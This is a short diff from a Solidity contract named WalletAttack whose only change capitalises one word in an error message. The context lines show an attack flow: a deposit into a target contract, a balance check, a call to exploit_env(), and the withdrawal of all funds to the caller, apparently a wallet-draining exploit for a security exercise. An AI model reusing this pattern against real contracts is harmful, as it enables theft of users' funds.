@@ -28,7 +28,7 @@ contract WalletAttack {
         _target = target;
         require(msg.value == 1 ether, "You must send exactly 1 ether");
         _target.deposit{value: 1 ether}();
-         require(address(_target).balance >= TARGET_AMOUNT - 1 , "target must have more than 3 ether");
+         require(address(_target).balance >= TARGET_AMOUNT - 1 , "Target must have more than 3 ether");
         exploit_env();
         (bool success, ) = (payable (msg.sender)).call{value: address(this).balance}("");
         require(success, "Unsucceful 34");
